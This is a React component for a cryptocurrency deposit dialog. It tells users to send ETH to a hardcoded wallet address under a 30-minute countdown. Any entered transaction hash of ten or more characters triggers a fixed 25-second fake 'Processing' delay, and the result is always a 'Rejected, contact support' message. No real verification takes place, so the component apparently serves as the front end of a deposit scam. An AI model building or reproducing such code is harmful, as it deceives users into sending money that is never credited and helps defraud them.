import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { CountdownTimer } from "@/components/CountdownTimer";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface DepositConfirmationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  amount: string;
  onConfirm: (hash: string) => void;
}

const DepositConfirmationDialog = ({
  isOpen,
  onClose,
  amount,
  onConfirm
}: DepositConfirmationDialogProps) => {
  const [transactionHash, setTransactionHash] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";
  
  const endTime = new Date(new Date().getTime() + 30 * 60000).toISOString();

  const validateHash = (hash: string) => {
    if (hash.length < 10) {
      toast({
        variant: "destructive",
        title: "Ошибка",
        description: "Неправильный hash, проверьте введенные данные"
      });
      return false;
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!validateHash(transactionHash)) {
      return;
    }

    setIsSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 25000));
    setIsSubmitting(false);
    
    toast({
      variant: "destructive",
      title: "Отклонено",
      description: "Свяжитесь с поддержкой"
    });
    
    onConfirm(transactionHash);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Deposit Confirmation</DialogTitle>
          <DialogDescription className="space-y-4">
            <div className="mt-4">
              <CountdownTimer endTime={endTime} />
            </div>
            
            <div className="space-y-2 mt-4">
              <p>Please send {amount} ETH to the following address:</p>
              <div className="bg-muted p-2 rounded-md break-all font-mono">
                {walletAddress} (ERC-20)
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">
                Transaction Hash
              </label>
              <Input
                value={transactionHash}
                onChange={(e) => setTransactionHash(e.target.value)}
                placeholder="Enter transaction hash"
                className="font-mono"
              />
            </div>

            <Button 
              className="w-full" 
              onClick={handleSubmit}
              disabled={!transactionHash || isSubmitting}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Processing...
                </>
              ) : (
                'Confirm'
              )}
            </Button>
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
};

export default DepositConfirmationDialog;